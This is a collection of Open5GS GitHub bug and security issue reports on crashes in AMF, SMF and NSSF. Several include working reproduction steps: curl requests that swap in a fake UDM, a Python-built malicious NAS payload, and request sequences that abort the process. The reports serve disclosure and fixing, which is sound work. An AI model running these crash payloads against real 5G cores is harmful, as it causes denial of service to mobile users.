items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Description

AMF aborts during a real UE registration flow when the `Nudm_SDM` `am-data`
response contains too many `nssai.defaultSingleNssais` entries.

This path is UE-driven: the crash is only reached after an external UE starts a
normal 5G registration procedure and AMF performs:

```text
PUT /nudm-uecm/v1/{supi}/registrations/amf-3gpp-access
GET /nudm-sdm/v2/{supi}/am-data
GET /nudm-sdm/v2/{supi}/smf-select-data
GET /nudm-sdm/v2/{supi}/ue-context-in-smf-data
POST /nudm-sdm/v2/{supi}/sdm-subscriptions
```

inside the registration state machine.

The root cause starts in `amf_nudm_sdm_handle_provisioned()`:

```c
DefaultSingleNssaiList = NSSAI->default_single_nssais;
if (DefaultSingleNssaiList) {
    OpenAPI_list_for_each(DefaultSingleNssaiList, node) {
        ogs_slice_data_t *slice = &amf_ue->slice[amf_ue->num_of_slice];
        ...
        amf_ue->num_of_slice++;
    }
}
```

at `../src/amf/nudm-handler.c:95-116`.

The destination array has fixed size `OGS_MAX_NUM_OF_SLICE == 8`:

```c
ogs_slice_data_t slice[OGS_MAX_NUM_OF_SLICE];
```

at `../src/amf/context.h:523` with the macro defined in
`../lib/proto/types.h:137`.

There is no bounds check while copying the attacker-controlled
`defaultSingleNssais` entries into `amf_ue->slice[]`. In the confirmed run, the
memory corruption reached the next stage of the registration flow and tripped a
defensive assertion in `gmm_state_registered`:

```c
ogs_assert(amf_ue->num_of_slice <= OGS_MAX_NUM_OF_SLICE);
```

This is not a duplicate of the existing AMF reports under `report/amf/`. It is
a different entry chain, different trust boundary, and different crash site
from the `namf-*`, `nnrf-*`, and newly confirmed `gpsis` overflow issue.

### Root cause

- Entry chain:
  external UE registration
  -> AMF `PUT /nudm-uecm/.../amf-3gpp-access`
  -> AMF `GET /nudm-sdm/v2/{supi}/am-data`
  -> `amf_nudm_sdm_handle_provisioned()`
  -> later registration-state validation
- Root-cause write site:
  `../src/amf/nudm-handler.c:95-116`
- Crash site:
  `gmm_state_registered: Assertion 'amf_ue->num_of_slice <= OGS_MAX_NUM_OF_SLICE' failed`
- Root cause family:
  fixed-size array overflow / state corruption followed by assertion abort
- Controlling field:
  `AccessAndMobilitySubscriptionData.nssai.defaultSingleNssais`

### Steps to Reproduce

1. Start the Open5GS Docker lab and ensure these containers are running:

```bash
docker start db ausf udm udr pcf smf upf amf nssf
```

2. Confirm the subscriber exists in MongoDB. In my live run, the existing test
subscriber was:

```text
IMSI: 001011234567891
```

3. Start a real gNB and UE with the bundled UERANSIM configs:

```bash
docker run --rm -d --name amf-audit-gnb --network open5gs \
  --network-alias gnb.ueransim.org \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/gnb.yaml:/ueransim/config/gnb.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-gnb -c /ueransim/config/gnb.yaml

docker run --rm -d --name amf-audit-ue --network open5gs \
  --network-alias ue.ueransim.org \
  --cap-add NET_ADMIN --device /dev/net/tun:/dev/net/tun \
  -v /home/ubuntu/docker-open5gs/configs/internal/ueransim/ue.yaml:/ueransim/config/ue.yaml:ro \
  free5gc/ueransim:latest /ueransim/nr-ue -c /ueransim/config/ue.yaml -r
```

4. Start the fake UDM helper on the host:

```bash
node /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.js
```

5. Replace the real UDM in AMF's local cache with the fake UDM:

```bash
AMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' amf)

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_DEREGISTERED","nfInstanceUri":"http://nrf.open5gs.org/nnrf-nfm/v1/nf-instances/4568f3be-3644-41f1-bff0-3b335fd843b5"}'

curl --http2-prior-knowledge -sS -i -m 8 \
  -X POST "http://$AMF_IP/nnrf-nfm/v1/nf-status-notify" \
  -H 'content-type: application/json' \
  --data '{"event":"NF_REGISTERED","nfInstanceUri":"http://10.33.33.1:18083/nnrf-nfm/v1/nf-instances/fake-udm-amf","nfProfile":{"nfInstanceId":"fake-udm-amf","nfType":"UDM","nfStatus":"REGISTERED","fqdn":"fake-udm-amf.local","ipv4Addresses":["10.33.33.1"],"allowedNfTypes":["SCP","AMF","SMF","AUSF"],"priority":0,"capacity":100,"load":0,"nfServices":[{"serviceInstanceId":"fake-udm-ueau","serviceName":"nudm-ueau","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AUSF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-uecm","serviceName":"nudm-uecm","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0},{"serviceInstanceId":"fake-udm-sdm","serviceName":"nudm-sdm","versions":[{"apiVersionInUri":"v2","apiFullVersion":"2.0.0"}],"scheme":"http","nfServiceStatus":"REGISTERED","ipEndPoints":[{"ipv4Address":"10.33.33.1","port":18083}],"allowedNfTypes":["AMF","SMF"],"priority":0,"capacity":100,"load":0}]}}'
```

6. Control experiment: configure the fake UDM for a single normal
`defaultSingleNssai`, then restart `gnb` and `ue` and wait for successful
registration:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-gnb amf-audit-ue
docker logs --tail 60 amf-audit-ue
docker inspect -f '{{.State.Status}} {{.State.ExitCode}}' amf
```

In the confirmed control run, the fake UDM received the full `am-data`,
`smf-select-data`, `ue-context-in-smf-data`, and `sdm-subscriptions` sequence,
and the UE completed registration plus PDU session establishment.

7. Malicious experiment: change only the fake UDM mode so `am-data` returns
`32` identical `defaultSingleNssais`, then restart `gnb` and `ue` again:

```bash
printf 'am-data-slice-overflow\n' > /home/ubuntu/open5gs_277/.audit_tmp/amf_fake_udm.mode
docker restart amf-audit-gnb amf-audit-ue

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' amf
docker logs --tail 120 amf
```

### Logs

Control UE result:

```text
Initial Registration is successful
PDU Session establishment is successful PSI[1]
```

Control AMF state:

```text
running 0
```

Malicious evidence from the fake UDM:

```text
2026-04-12T08:16:58.089Z PUT /nudm-uecm/v1/imsi-001011234567891/registrations/amf-3gpp-access mode=am-data-slice-overflow body={...}
2026-04-12T08:16:58.092Z GET /nudm-sdm/v2/imsi-001011234567891/am-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.093Z GET /nudm-sdm/v2/imsi-001011234567891/smf-select-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.094Z GET /nudm-sdm/v2/imsi-001011234567891/ue-context-in-smf-data?... mode=am-data-slice-overflow body=<empty>
2026-04-12T08:16:58.095Z POST /nudm-sdm/v2/imsi-001011234567891/sdm-subscriptions mode=am-data-slice-overflow body={...}
```

```text
exited 134 2026-04-12T14:39:40.15931599Z 0
```

AMF logs:


items.title: [Bug]: SMF crash in ogs_hash_get_debug: Assertion `klen' failed after two SBI requests

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

The SMF process crashes with a fatal assertion failure in `ogs_hash_get_debug()` when two SBI requests are sent in sequence to the SMF SBI endpoint.

Crash location:

```c
lib/core/ogs-hash.c:316
OGS_ASSERT(klen);
```

The assertion failure indicates that `ogs_hash_get()` is called with a zero-length key at some point after the first request is processed.

### Minimal reproduction sequence

The following tests confirmed that both messages are necessary:

```text
smf_ctx_create_wrong_plmn alone -> SMF alive
second SBI request alone -> SMF alive
both in sequence -> CRASH / connection reset
```

#### Message 1 — trigger request

```http
POST /nsmf-pdusession/v1/sm-contexts HTTP/2
Host: 127.0.0.4:7777
Content-Type: application/json
```

```json
{
  "supi": "imsi-001010000000001",
  "dnn": "internet",
  "sNssai": { "sst": 1, "sd": "010203" },
  "servingPlmnId": "99970",
  "anType": "3GPP_ACCESS",
  "ratType": "NR",
  "pduSessionId": 1
}
```

After this first request, the HTTP/2 connection remains open and the SMF process is still alive.

#### Message 2 — second SBI request to the same endpoint

```http
GET /nnrf-disc/v1/nf-instances?target-nf-type=NRF&requester-nf-type=AMF HTTP/2
```

This request is sent to the SMF SBI port as a second SBI request to trigger further processing. It is not a functionally valid SMF request.

Observed result:

```text
Message 1 -> HTTP/2 connection remains open, SMF alive
Message 2 -> connection reset, SMF process exits
```

### Crash log

```text
[core] FATAL: ogs_hash_get_debug: Assertion `klen' failed.
(../lib/core/ogs-hash.c:316)

[core] FATAL: backtrace() returned 12 addresses
libogscore.so.2(ogs_abort+0xbb)
libogscore.so.2(ogs_hash_get_debug+0x153)
open5gs-smfd(+0x2bff76)
```

The same `open5gs-smfd(+0x2bff76)` offset was observed across multiple SMF restart cycles.

Before each crash, the SMF logs a failed NRF connection attempt:

```text
[sbi] WARNING: Couldn't connect to server (7): Failed to connect to
127.0.0.200 port 7777 after 0 ms
[sbi] WARNING: ogs_sbi_client_handler() failed [-1]
```

### Root cause hypothesis

The crash appears to occur in an asynchronous SBI processing path after the first request has created or referenced partially initialized SMF state. Since the fatal assertion shows that `ogs_hash_get()` is called with `klen == 0`, the SMF session lookup path may be using an empty or uninitialized key after the failed `CreateSMContext` path.

A fully symbolized backtrace would be needed to confirm the exact caller and the specific field used as the empty key.

### Suggested fix

A defensive fix would be to ensure that no SMF session lookup calls `ogs_hash_get()` with an empty key.

Before calling:

```c
ogs_hash_get(hash, key, strlen(key));
```

the relevant lookup path should reject or skip entries where:

```c
key == NULL || strlen(key) == 0
```

A more complete fix should also ensure that, when `CreateSMContext` processing fails because of an invalid or mismatched PLMN, any partially initialized SM context is either fully cleaned up or marked invalid before asynchronous SBI callbacks or later SBI processing can access it.

### Impact

```text
Severity: deterministic SMF process crash / DoS through its SBI endpoint
Affected NF: SMF / open5gs-smfd
Crash type: ogs_assert / SIGABRT
Messages needed: 2, ordered sequence
Recovery: SMF must be restarted
Auth required: none in the tested configuration
```

### Environment

```text
Open5GS version: v2.7.7
Build: local build from source
OS: Ubuntu x86_64
```


### Logs

```shell

```

### Expected behaviour

The SMF should reject the invalid CreateSMContext request or the following SBI request gracefully without aborting the process. A malformed or invalid request sequence should not lead to an assertion failure in ogs_hash_get_debug().

### Observed Behaviour

The SMF process terminates with:

[core] FATAL: ogs_hash_get_debug: Assertion `klen' failed.
(../lib/core/ogs-hash.c:316)

The crash is deterministic and requires the two requests in sequence. Each request alone leaves the SMF process alive.

### eNodeB/gNodeB

N/A

### UE Models and versions

N/A

items.title: [Bug]: NSSF crash on delayed Home-NSSF response after client disconnect in `GET /nnssf-nsselection/v2/network-slice-information`

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NSSF crashes if a Home-NSSF selection request causes an outbound
`nnssf-nsselection` query and the original client disconnects before the Home
NSSF response arrives.

In the NSSF client-response FSM path, the code retrieves the original
associated stream by ID:

```c
stream = ogs_sbi_stream_find_by_id(sbi_xact->assoc_stream_id);
...
nssf_nnrf_nsselection_handle_get_from_hnssf(home, stream, &message);
```

If the original requester has already timed out or reset the HTTP/2 stream,
`ogs_sbi_stream_find_by_id()` returns `NULL`. The called handler immediately
asserts that the stream pointer is non-NULL:

```c
ogs_assert(stream);
```

This makes a delayed but otherwise valid Home-NSSF response a process-killing
event once the original stream is gone.

### Steps to reproduce

This reproduction used the live Open5GS Docker lab with temporary test setup to
force the Home-NSSF path:

1. Add serving PLMN entries to the live lab configs so NRF accepts a fake Home
   NSSF registration and local NSSF can build Home-NSSF discovery:

```yaml
# /home/ubuntu/docker-open5gs/configs/basic/nrf.yaml
nrf:
  serving:
    - plmn_id: { mcc: 001, mnc: 01 }
    - plmn_id: { mcc: 999, mnc: 70 }
```

```yaml
# /home/ubuntu/docker-open5gs/configs/basic/nssf.yaml
nssf:
  serving:
    - plmn_id: { mcc: 001, mnc: 01 }
```

2. Restart `nrf` and `nssf`.
3. Register a fake Home NSSF into NRF with a long heartbeat and an
   `nnssf-nsselection` service endpoint pointing to a local delayed h2c test
   server (`10.33.33.1:18081` in this live setup).
4. Run a delayed Home-NSSF responder that accepts HTTP/2 cleartext and returns
   a valid `AuthorizedNetworkSliceInfo` only after 3 seconds.
5. Send the original request with a 1-second timeout so the client aborts
   before the delayed response returns:

```bash
curl --http2-prior-knowledge --max-time 1 -sS -i --get \
  'http://10.33.33.5/nnssf-nsselection/v2/network-slice-information' \
  --data-urlencode 'nf-id=test-amf' \
  --data-urlencode 'nf-type=AMF' \
  --data-urlencode 'home-plmn-id={"mcc":"999","mnc":"70"}' \
  --data-urlencode 'slice-info-request-for-pdu-session={"sNssai":{"sst":1,"sd":"000001"},"homeSnssai":{"sst":1,"sd":"000001"},"roamingIndication":"HOME_ROUTED_ROAMING"}'
```

6. Wait for the delayed Home-NSSF response to arrive, then check the NSSF
   container state and logs.

### Logs

```shell
Original requester:


curl: (28) Operation timed out after 1001 milliseconds with 0 bytes received


Delayed Home-NSSF backend saw the request:


GET /nnssf-nsselection/v2/network-slice-information?slice-info-request-for-pdu-session=%7B%22sNssai%22%3A%7B%22sst%22%3A1%2C%22sd%22%3A%22000001%22%7D%2C%22roamingIndication%22%3A%22HOME_ROUTED_ROAMING%22%7D&nf-id=f806e06c-3509-41f1-a3ee-09fbeb9317ec&snssai=%7B%22sst%22%3A1%2C%22sd%22%3A%22000001%22%7D&nf-type=NSSF


Container state:


exited 139 2026-04-10T18:25:33.593273294Z


NSSF logs:


04/10 18:25:31.450: [sbi] INFO: RST_STREAM received: stream_id=1 (../lib/sbi/nghttp2-server.c:1288)
04/10 18:25:33.483: [nssf] FATAL: nssf_nnrf_nsselection_handle_get_from_hnssf: Assertion `stream' failed. (../src/nssf/nnssf-handler.c:189)
```

### Expected behaviour

If the original requester disconnects before the Home-NSSF response arrives,
NSSF should discard the late response or clean up the transaction safely without
touching a dead stream.

### Observed Behaviour

The original client times out, the stream is closed, and the later Home-NSSF
response causes NSSF to assert on a `NULL` stream pointer and exit with code
`139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: SMF crash on `POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify` with invalid bitrate unit in `n1SmMsg` QoS flow descriptions

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce


### Description

SMF crashes when a `PDU Session Modification Request` delivered through
`SmContextUpdateData.n1SmMsg` carries a syntactically valid
`requested_qos_flow_descriptions` IE whose bitrate parameter uses an invalid
NAS bitrate unit.

The parser accepts the 3-byte bitrate structure without validating the unit in
`ogs_nas_parse_qos_flow_descriptions()`. Later
`gsm_handle_pdu_session_modification_qos_flow_descriptions()` calls
`ogs_nas_bitrate_to_uint64()` on the attacker-controlled bitrate:

```c
case OGS_NAX_QOS_FLOW_PARAMETER_ID_GFBR_UPLINK:
    qos_flow->qos.gbr.uplink = ogs_nas_bitrate_to_uint64(
            &qos_flow_description[i].param[j].br);
    break;
```

`ogs_nas_bitrate_to_uint64()` fatally aborts on unknown units:

```c
ogs_fatal("Unknown unit [%d]", nas_bitrate->unit);
ogs_assert_if_reached();
```

This issue is distinct from the previously confirmed
`nsmf-pdusession-pdu-sessions-createddata-invalid-qosflowdescription-assert-abort`
report. That older issue is on the H-SMF `201 Created` callback path; this one
is on the AMF-facing `sm-contexts/{ref}/modify` N1 business path.

### Steps to reproduce

1. Start the Docker lab and ensure `smf` and `smf-audit-ue` are running.
2. Resolve the current SMF container IP and an active `smContextRef`:

```bash
SMF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smf)
docker restart smf-audit-ue >/dev/null
sleep 3

REF=$(
  for i in $(seq 1 30); do
    code=$(curl --http2-prior-knowledge -m 5 -sS -o /tmp/probe.body -w '%{http_code}' \
      -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$i/modify" \
      -H 'Content-Type: application/json' \
      --data '{"hoState":"COMPLETED"}')
    if [ "$code" != 404 ]; then
      echo "$i"
      break
    fi
  done
)
echo "SMF_IP=$SMF_IP REF=$REF"
```

3. Prepare a multipart `SmContextUpdateData` with only `n1SmMsg`, using the
malicious NAS payload below. The payload is a `PDU Session Modification
Request` whose `requested_qos_flow_descriptions` contains a GFBR uplink
parameter with bitrate `unit=0`, which is not a valid NAS bitrate unit:

```bash
python3 - <<'PY'
from pathlib import Path
import json

boundary = 'REQBOUNDARY'
body = {'n1SmMsg': {'contentId': '5gnas-sm'}}
n1 = bytes.fromhex('2e0101c97900080160410203000001')

parts = []
parts.append(
    (f'--{boundary}\r\nContent-Type: application/json\r\n\r\n'.encode()) +
    json.dumps(body, separators=(',', ':')).encode() + b'\r\n'
)
parts.append(
    (f'--{boundary}\r\nContent-Id: 5gnas-sm\r\n'
     f'Content-Type: application/vnd.3gpp.5gnas\r\n\r\n'.encode()) +
    n1 + b'\r\n'
)
parts.append(f'--{boundary}--\r\n'.encode())

Path('/tmp/smctx_modify_invalid_bitrate.multipart').write_bytes(b''.join(parts))
PY
```

4. Send the request:

```bash
curl --http2-prior-knowledge -m 10 -sS -i \
  -X POST "http://$SMF_IP/nsmf-pdusession/v1/sm-contexts/$REF/modify" \
  -H 'Content-Type: multipart/related; boundary=REQBOUNDARY' \
  --data-binary @/tmp/smctx_modify_invalid_bitrate.multipart
```

5. Check the SMF process state and logs:

```bash
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}}' smf
docker logs --tail 120 smf
```

### Logs

```shell
Client side:


curl: (92) HTTP/2 stream 1 was not closed cleanly


SMF state:


exited 139 2026-04-11T07:52:16.722895347Z


SMF log:


04/11 07:52:16.598: [nas] FATAL: Unknown unit [0] (../lib/nas/common/types.c:502)
04/11 07:52:16.598: [nas] FATAL: ogs_nas_bitrate_to_uint64: should not be reached. (../lib/nas/common/types.c:503)
```

### Expected behaviour

SMF should reject invalid NAS bitrate units in the `n1SmMsg`
`PDU Session Modification Request` and fail only that transaction.

### Observed Behaviour

The crafted `n1SmMsg` aborts the entire SMF process before any HTTP response is
completed, leaving the client with a transport error and the SMF container
exiting with code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: SMF Crash: Assertion Failure in smf_n4_build_pdr_to_modify_list() when Processing Incomplete PDUSessionResourceSetupResponse

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

the latest

### Steps to reproduce

## Environment
- **OS:** Linux (specify distribution and version)
- **Test Method:** Protocol fuzzing via NGAP interface

## Reproduction Steps

1. **Setup:** Configure Open5GS with AMF and SMF components

2. **Send malformed NGAP message:** Construct and send a `PDUSessionResourceSetupResponse` message with the following characteristics:
   - **Present IEs:**
     - `qosFlowIdentifier` in `associatedQosFlowList`
   - **Missing critical IEs:**
     - `upTNLInformation` (UL/DL GTP tunnel information)
     - Other tunnel endpoint parameters

3. **Message path:** 
```
   Fuzzer/Test Tool → AMF (N2) → SMF (crash occurs here)
```

4. **Trigger point:** SMF processes the response and attempts to build PFCP Session Modification Request for UPF

## Detailed Message Structure

The problematic message has the following ASN.1 path (payload only contains):
```
successfulOutcome
  └─ value
      └─ PDUSessionResourceSetupResponse
          └─ protocolIEs[2]
              └─ value
                  └─ PDUSessionResourceSetupListSURes[0]
                      └─ pDUSessionResourceSetupResponseTransfer
                          └─ PDUSessionResourceSetupResponseTransfer
                              └─ dLQosFlowPerTNLInformation
                                  └─ associatedQosFlowList[0]
                                      └─ qosFlowIdentifier  ← ONLY THIS FIELD PRESENT
```

**Key issue:** The message contains ONLY `qosFlowIdentifier` without tunnel configuration.

## Root Cause

When SMF processes this incomplete message:
1. It cannot extract tunnel information (`upTNLInformation` is missing)
2. It determines NO PFCP modifications are needed for the UPF
3. All modification counters become zero:
   - `num_of_remove_pdr = 0`
   - `num_of_remove_far = 0`
   - `num_of_create_pdr = 0`
   - `num_of_create_far = 0`
   - `num_of_update_pdr = 0`
   - `num_of_update_far = 0`
   - `num_of_update_qer = 0`
   - `num_of_update_urr = 0`
4. The assertion at `src/smf/n4-build.c:337` fails → **SMF crashes**

## Code Location
```c
// File: src/smf/n4-build.c, Line 337
ogs_assert(num_of_remove_pdr + num_of_remove_far + num_of_create_pdr + 
           num_of_create_far + num_of_update_pdr + num_of_update_far + 
           num_of_update_qer + num_of_update_urr);
```

### Logs

```shell
12/08 15:21:30.086: [smf] FATAL: smf_n4_build_pdr_to_modify_list: Assertion `num_of_remove_pdr + num_of_remove_far + num_of_create_pdr + num_of_create_far + num_of_update_pdr + num_of_update_far + num_of_update_qer + num_of_update_urr' failed. (../src/smf/n4-build.c:337)
12/08 15:21:30.087: [core] FATAL: backtrace() returned 13 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

When receiving a `PDUSessionResourceSetupResponse` with incomplete or malformed IEs:

1. **Input validation:** SMF should detect missing critical IEs (e.g., `upTNLInformation`)

2. **Error handling:** Instead of crashing with assertion, SMF should:
   - Log a clear error message indicating which IEs are missing
   - Either:
     - **Option A:** Send an error response back to AMF indicating the incomplete message
     - **Option B:** Skip the PFCP update and continue processing (if semantically valid)
     - **Option C:** Use default/fallback values if appropriate

3. **Graceful degradation:** The SMF process should remain stable and continue serving other PDU sessions

4. **Example expected log:**
```
   [smf] WARNING: PDUSessionResourceSetupResponse missing upTNLInformation IE
   [smf] ERROR: Cannot build PFCP Session Modification Request - insufficient tunnel info
   [smf] INFO: Sending error response to AMF
```

**No process crash should occur** - this is a network message parsing issue, not a fatal system error.

### Observed Behaviour

1. **Immediate crash:** SMF process terminates with `SIGABRT` when processing the malformed message

2. **No error recovery:** The assertion provides no opportunity for error handling or recovery

3. **Service disruption:**
   - All existing PDU sessions managed by this SMF instance are terminated
   - New session setup requests cannot be processed until SMF is restarted
   - Complete denial of service for all users served by this SMF

4. **Impact scope:**
   - **Single message** can crash the entire SMF instance
   - Affects **all UEs** currently connected through this SMF
   - Requires **manual intervention** (process restart) to restore service



This is a **Denial of Service (DoS) vulnerability**:
- **Attack vector:** Network-accessible via NGAP interface (N2)
- **Privilege required:** Ability to send NGAP messages to AMF (e.g., compromised gNB or malicious UE with modified protocol stack)
- **Impact:** Complete SMF service disruption
- **Reproducibility:** 100% - single malformed message triggers crash

### eNodeB/gNodeB

UERANSIM：the latest

### UE Models and versions

UERANSIM：the latest

items.title: [Bug]: # AMF NAS Security Header Stripping Without Security Context Verification Allows Message Parsing Manipulation
items.body:
### Open5GS Release, Revision, or Tag

v2.7.7 

### Steps to reproduce

 1. Start Open5GS with the default sample.yaml configuration.
 2. Connect a gNB and have a UE begin initial registration so that the AMF sends an Identity Request (T3570 retransmission timer starts, UE is in 5GMM-DEREGISTERED state, waiting for Identity Response).
  3. Before the UE replies with an Identity Response, send a malformed Uplink NAS Transport PDU whose extended_protocol_discriminator is neither 0x7E (5GMM) nor 0x2E (5GSM). For example, a byte-mutated PDU Session Modification Request where corruption shifts the discriminator to 0x00.
  4. Observe the AMF log output.

  What happens internally:

  ngap_send_to_nas() in src/amf/ngap-path.c:287–294 hits the
unknown-discriminator else branch:
if {
....
  } else {
      ogs_error("Unknown NAS Protocol discriminator 0x%02x",
                h->extended_protocol_discriminator);
      ogs_pkbuf_free(nasbuf);
      ran_ue_remove(ran_ue);   // Removes RAN-UE context
      return OGS_ERROR;        // amf_ue and its timers are NOT cleaned up
  }

  It calls ran_ue_remove(ran_ue) to destroy the RAN-side UE context, but does not clean up the associated amf_ue or cancel its running NAS timers (T3570).
  The orphaned amf_ue then fires timer callbacks into the already-removed RAN context, producing the cascading errors shown in the Logs section.

  Note: The InitialUEMessage error path at ngap-path.c:231–254 also calls ran_ue_remove() on error, but at that stage no amf_ue or timer exists yet, so the cleanup is sufficient. The UplinkNASTransport path (line 287) runs after partial registration when amf_ue and its timers are already active — removing only ran_ue is insufficient.

  Suggested fix — cancel timers and transition amf_ue before removing ran_ue:
if{ ....
  } else {
      ogs_error("Unknown NAS Protocol discriminator 0x%02x",
                h->extended_protocol_discriminator);

      ogs_pkbuf_free(nasbuf);

      if (amf_ue) {
          CLEAR_AMF_UE_ALL_TIMERS(amf_ue);
          OGS_FSM_TRAN(&amf_ue->sm, &gmm_state_exception);
      }

      ran_ue_remove(ran_ue);

      return OGS_ERROR;
  }

  The amf_ue pointer is already resolved earlier in ngap_send_to_nas() via
  ran_ue->amf_ue. The CLEAR_AMF_UE_ALL_TIMERS macro and gmm_state_exception
  transition follow the same pattern used elsewhere in the AMF codebase (e.g.
  gmm-sm.c:159–160, gmm-sm.c:174–175).

### Logs

```shell
AMF log output after sending the malformed NAS PDU:

  [amf] ERROR: Unknown NAS Protocol discriminator 0x00
  (../src/amf/ngap-path.c:288)
  [amf] INFO:  [Removed] Number of gNB-UEs is now 0 (../src/amf/context.c:2784)
  [amf] ERROR: ngap_handle_uplink_nas_transport: Expectation `OGS_OK ==
               ngap_send_to_nas(ran_ue,
  NGAP_ProcedureCode_id_UplinkNASTransport,
               NAS_PDU)' failed. (../src/amf/ngap-handler.c:801)
  [amf] ERROR: [(null)] NG context has already been removed
  (../src/amf/nas-path.c:437)
  [gmm] ERROR: gmm_state_de_registered: Expectation `r == OGS_OK' failed.
               (../src/amf/gmm-sm.c:164)
```

### Expected behaviour

When ngap_send_to_nas() encounters an unrecognized
  extended_protocol_discriminator on an UplinkNASTransport message, it should clean up both the RAN-side and NAS-side UE state before returning:
  
  1. Cancel all active NAS timers (T3570, T3560, T3522, etc.) on the associated amf_ue
  2. Transition amf_ue to gmm_state_exception (or remove it entirely)
  3. Then remove ran_ue

  This would prevent the orphaned amf_ue from firing timer callbacks into a destroyed RAN context, eliminating the cascading ogs_expect failures and the resource leak under repeated malformed-packet injection.

### Observed Behaviour

After sending the malformed NAS PDU, ran_ue is removed but amf_ue and its T3570 timer are left running. This causes:
  
  - State inconsistency: amf_ue persists with a stale ran_ue_id reference pointing to a destroyed RAN context. Timer callbacks repeatedly fail trying to reach it, producing ogs_expect error logs on every retry until max_count is exhausted.
  - Resource leak: Under repeated malformed-packet injection, orphaned amf_ue contexts accumulate until their timers exhaust retries, consuming pool resources.
  - Potential crash: During NAS test, this defect was observed to contribute to AMF process crashes when combined with accumulated residual state from prior rounds. The ogs_expect soft assertions prevent an immediate crash on a clean restart, but the underlying state corruption may escalate under sustained adversarial input.


### eNodeB/gNodeB

UERANSIM

### UE Models and versions

UERANSIM

items.title: [Bug]: SMF leaks QoS flows in `sess->bearer_list` when SmPolicyDecision is treated as full-state replacement; violates TS 23.503 §6.1.3.2.4 mandate to delete QoS Flow when last PCC rule is removed

labels.name: type:bug
labels.description: Open5GS bug

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
## Open5GS Release, Revision, or Tag

`v2.7.7` + 6 commits ahead of upstream main (commit `288f1ca49`). Reproduced with the `npcf-handler.c` and `binding.c` paths unchanged from upstream. Observed under heavy IMS workload (P-CSCF→PCF N5 PolicyAuthorization, multiple AppSessions per PDU session over time).

## Summary

`update_authorized_pcc_rule_and_qos()` in `src/smf/npcf-handler.c` rebuilds `sess->policy.pcc_rule[]` from scratch on every `SmPolicyDecision` notify (Create/Update/Delete), zeroing all prior entries. This treats the notify as **full-state replacement**, which contradicts TS 23.503 §6.1.3.2.2 — the PCF only includes PCC rules being **added, modified, or removed** in a notify; rules absent from the message remain authorized.

Downstream consequence: when a per-AppSession DELETE-notify races with a subsequent CREATE/UPDATE-notify (very common under IMS call churn), the rule the DELETE-notify wants to REMOVE has already been wiped from `policy.pcc_rule[]` by the rebuild. SMF logs `QosFlow[Id:%s] has already been removed` (`src/smf/binding.c:756-758`) and **does not delete the QoS Flow** — directly violating the normative *"the SMF shall delete the QoS Flow"* mandate of TS 23.503 §6.1.3.2.4.

The orphaned QoS flow stays in `sess->bearer_list` indefinitely. Because `OGS_MAX_NUM_OF_BEARER` is 4 in `lib/proto/types.h`, the bearer list fills after a small number of churned AppSessions; the next call requesting two flows (audio + video medComponents) hits `ogs_error("QosFlow Overflow[%d]", ...)` at `src/smf/binding.c:547`, the second flow never installs, and from the UE's perspective the call dies with `580 Precondition Failure` (no 5QI=2 video bearer authorized).

## Spec citations (TS 23.503 v18.10.0)

**§6.1.3.2.2 Session binding** — SmPolicyDecision is delta-based:
> *"Once it has determined the impacted PDU Session, the PCF shall identify the PCC rules affected by the AF session information, **including new PCC rules to be installed and existing PCC rules to be modified or removed**."*

**§6.1.3.2.4 QoS Flow binding** — SMF must delete the QoS Flow when last PCC rule is removed:
> *"When the PCF removes a PCC Rule, the SMF shall remove the association of the PCC Rule to the QoS Flow. **If the last PCC rule that is bound to a QoS Flow is removed, the SMF shall delete the QoS Flow.**"*

**§6.1.3.13 Resource sharing for different AF sessions** — AF session termination triggers PCC rule removal:
> *"The AF session termination or modification procedure that removes media flows triggers the removal of the corresponding PCC rules from the SMF."*

## Steps to reproduce

